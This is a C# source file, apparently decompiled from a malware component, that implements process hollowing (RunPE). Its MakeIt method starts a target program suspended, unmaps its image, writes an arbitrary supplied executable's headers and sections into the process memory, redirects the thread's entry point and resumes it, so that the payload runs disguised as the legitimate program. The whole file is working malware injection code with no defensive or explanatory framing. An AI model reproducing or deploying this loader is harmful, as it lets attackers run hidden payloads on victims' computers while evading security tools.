using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace winini;

public class rp
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class H
	{
		public struct Context
		{
			public uint Flags;

			public uint D0;

			public uint D1;

			public uint D2;

			public uint D3;

			public uint D6;

			public uint D7;

			public Save Save;

			public uint SG;

			public uint SF;

			public uint SE;

			public uint SD;

			public uint Edi;

			public uint Esi;

			public uint Ebx;

			public uint Edx;

			public uint Ecx;

			public uint Eax;

			public uint Ebp;

			public uint Eip;

			public uint SC;

			public uint EFlags;

			public uint Esp;

			public uint SS;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] Registers;
		}

		public struct Save
		{
			public uint Control;

			public uint Status;

			public uint Tag;

			public uint ErrorO;

			public uint ErrorS;

			public uint DataO;

			public uint DataS;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] RegisterArea;

			public uint State;
		}

		public struct Misc
		{
			public uint Address;

			public uint Size;
		}

		public struct Section_Header
		{
			public byte Name;

			public Misc Misc;

			public uint Address;

			public uint Size;

			public uint Pointer;

			public uint PRelocations;

			public uint PLines;

			public uint NRelocations;

			public uint NLines;

			public uint Flags;
		}

		public struct Process_Information
		{
			public IntPtr Process;

			public IntPtr Thread;

			public int ProcessId;

			public int ThreadId;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Startup_Information
		{
			public int CB;

			public string ReservedA;

			public string Desktop;

			public string Title;

			public int X;

			public int Y;

			public int XSize;

			public int YSize;

			public int XCount;

			public int YCount;

			public int Fill;

			public int Flags;

			public short ShowWindow;

			public short ReservedB;

			public int ReservedC;

			public int Input;

			public int Output;

			public int Error;
		}

		public struct Security_Flags
		{
			public int Length;

			public IntPtr Descriptor;

			public int Inherit;
		}

		public struct DOS_Header
		{
			public ushort Magic;

			public ushort Last;

			public ushort Pages;

			public ushort Relocations;

			public ushort Size;

			public ushort Minimum;

			public ushort Maximum;

			public ushort SS;

			public ushort SP;

			public ushort Checksum;

			public ushort IP;

			public ushort CS;

			public ushort Table;

			public ushort Overlay;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
			public ushort[] ReservedA;

			public ushort ID;

			public ushort Info;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
			public ushort[] ReservedB;

			public int Address;
		}

		public struct NT_Headers
		{
			public uint Signature;

			public File_Header File;

			public Optional_Headers Optional;
		}

		public struct File_Header
		{
			public ushort Machine;

			public ushort Sections;

			public uint Stamp;

			public uint Table;

			public uint Symbols;

			public ushort Size;

			public ushort Flags;
		}

		public struct Optional_Headers
		{
			public ushort Magic;

			public byte Major;

			public byte Minor;

			public uint SCode;

			public uint IData;

			public uint UData;

			public uint Address;

			public uint Code;

			public uint Data;

			public uint Image;

			public uint SectionA;

			public uint FileA;

			public ushort MajorO;

			public ushort MinorO;

			public ushort MajorI;

			public ushort MinorI;

			public ushort MajorS;

			public ushort MinorS;

			public uint Version;

			public uint SImage;

			public uint SHeaders;

			public uint Checksum;

			public ushort Subsystem;

			public ushort Flags;

			public uint SSReserve;

			public uint SSCommit;

			public uint SHReserve;

			public uint SHCommit;

			public uint LFlags;

			public uint Count;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public Data_Directory[] DataDirectory;
		}

		public struct Data_Directory
		{
			public uint Address;

			public uint Size;
		}

		[DebuggerNonUserCode]
		public H()
		{
		}

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CreateProcess([MarshalAs(UnmanagedType.VBByRefStr)] ref string name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string command, ref Security_Flags process, ref Security_Flags thread, bool inherit, uint flags, IntPtr system, [MarshalAs(UnmanagedType.VBByRefStr)] ref string current, [In] ref Startup_Information startup, out Process_Information info);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] buffer, IntPtr size, out int written);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int ReadProcessMemory(IntPtr process, IntPtr address, ref IntPtr buffer, IntPtr size, ref int read);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int VirtualProtectEx(IntPtr process, IntPtr address, UIntPtr size, UIntPtr @new, [Out] uint old);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint type, uint protect);

		[DllImport("ntdll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern long ZwUnmapViewOfSection(IntPtr process, IntPtr address);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr thread);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool GetThreadContext(IntPtr thread, ref Context context);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool SetThreadContext(IntPtr thread, ref Context context);
	}

	public const long PAGE_NOCACHE = 512L;

	public const long PAGE_EXECUTE_READWRITE = 64L;

	public const long PAGE_EXECUTE_WRITECOPY = 128L;

	public const long PAGE_EXECUTE_READ = 32L;

	public const long PAGE_EXECUTE = 16L;

	public const long PAGE_WRITECOPY = 8L;

	public const long PAGE_NOACCESS = 1L;

	public const long PAGE_READWRITE = 4L;

	public const uint PAGE_READONLY = 2u;

	[DebuggerNonUserCode]
	public rp()
	{
	}

	public static void MakeIt(byte[] data, string target)
	{
		H.Context context = default(H.Context);
		H.Process_Information info = default(H.Process_Information);
		H.Startup_Information startup = default(H.Startup_Information);
		H.Security_Flags process = default(H.Security_Flags);
		H.Security_Flags thread = default(H.Security_Flags);
		GCHandle gCHandle = GCHandle.Alloc(data, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(H.DOS_Header).GetType());
		H.DOS_Header dOS_Header = default(H.DOS_Header);
		H.DOS_Header dOS_Header2 = ((obj != null) ? ((H.DOS_Header)obj) : dOS_Header);
		gCHandle.Free();
		string name = null;
		string current = null;
		IntPtr system = default(IntPtr);
		if (0 - (H.CreateProcess(ref name, ref target, ref process, ref thread, inherit: false, 4u, system, ref current, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		H.NT_Headers nT_Headers = default(H.NT_Headers);
		IntPtr ptr = new IntPtr(checked(num + dOS_Header2.Address));
		object? obj2 = Marshal.PtrToStructure(ptr, nT_Headers.GetType());
		H.NT_Headers nT_Headers2 = default(H.NT_Headers);
		nT_Headers = ((obj2 != null) ? ((H.NT_Headers)obj2) : nT_Headers2);
		startup.CB = Strings.Len((object)startup);
		context.Flags = 65538u;
		if (((long)nT_Headers.Signature != 17744L) | (dOS_Header2.Magic != 23117))
		{
			return;
		}
		bool threadContext = H.GetThreadContext(info.Thread, ref context);
		IntPtr process2 = info.Process;
		checked
		{
			IntPtr address = (IntPtr)(unchecked((long)context.Ebx) + 8L);
			long num2 = default(long);
			ptr = (IntPtr)num2;
			IntPtr size = (IntPtr)4;
			int read = 0;
			int num3 = H.ReadProcessMemory(process2, address, ref ptr, size, ref read);
			num2 = (long)ptr;
			if (!(unchecked(threadContext && num3 >= 0) & (H.ZwUnmapViewOfSection(info.Process, (IntPtr)num2) >= 0L)))
			{
				return;
			}
			uint num4 = (uint)(int)H.VirtualAllocEx(info.Process, (IntPtr)nT_Headers.Optional.Image, nT_Headers.Optional.SImage, 12288u, 4u);
			if (unchecked((long)num4) == 0L)
			{
				return;
			}
			IntPtr process3 = info.Process;
			IntPtr address2 = (IntPtr)num4;
			IntPtr size2 = (IntPtr)nT_Headers.Optional.SHeaders;
			uint num5 = default(uint);
			read = (int)num5;
			H.WriteProcessMemory(process3, address2, data, size2, out read);
			num5 = (uint)read;
			long num6 = dOS_Header2.Address + 248;
			int num7 = unchecked((int)nT_Headers.File.Sections) - 1;
			int num8 = 0;
			H.Section_Header section_Header = default(H.Section_Header);
			H.Section_Header section_Header2 = default(H.Section_Header);
			while (true)
			{
				int num9 = num8;
				int num10 = num7;
				if (num9 > num10)
				{
					break;
				}
				ptr = new IntPtr(num + num6 + num8 * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, section_Header.GetType());
				section_Header = ((obj3 != null) ? ((H.Section_Header)obj3) : section_Header2);
				byte[] array = new byte[(int)section_Header.Size + 1];
				int num11 = (int)(unchecked((long)section_Header.Size) - 1L);
				int num12 = 0;
				while (true)
				{
					int num13 = num12;
					num10 = num11;
					if (num13 > num10)
					{
						break;
					}
					array[num12] = data[(int)(unchecked((long)section_Header.Pointer) + unchecked((long)num12))];
					num12++;
				}
				IntPtr process4 = info.Process;
				IntPtr address3 = (IntPtr)(num4 + section_Header.Address);
				IntPtr size3 = (IntPtr)section_Header.Size;
				read = (int)num5;
				H.WriteProcessMemory(process4, address3, array, size3, out read);
				num5 = (uint)read;
				H.VirtualProtectEx(info.Process, (IntPtr)(num4 + section_Header.Address), (UIntPtr)section_Header.Misc.Size, (UIntPtr)(ulong)Protect(section_Header.Flags), (uint)num2);
				num8++;
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			IntPtr process5 = info.Process;
			IntPtr address4 = (IntPtr)(unchecked((long)context.Ebx) + 8L);
			IntPtr size4 = (IntPtr)4;
			read = (int)num5;
			H.WriteProcessMemory(process5, address4, bytes, size4, out read);
			num5 = (uint)read;
			context.Eax = num4 + nT_Headers.Optional.Address;
			H.SetThreadContext(info.Thread, ref context);
			H.ResumeThread(info.Thread);
		}
	}

	private static long RShift(long lValue, long lNumberOfBitsToShift)
	{
		return checked((long)Math.Round(vbLongToULong(lValue) / Math.Pow(2.0, lNumberOfBitsToShift)));
	}

	private static double vbLongToULong(long Value)
	{
		if (Value < 0L)
		{
			return (double)Value + 4294967296.0;
		}
		return Value;
	}

	private static long Protect(long characteristics)
	{
		object[] array = new object[8] { 1L, 16L, 2u, 32L, 4L, 64L, 4L, 64L };
		return Conversions.ToLong(array[checked((int)RShift(characteristics, 29L))]);
	}
}
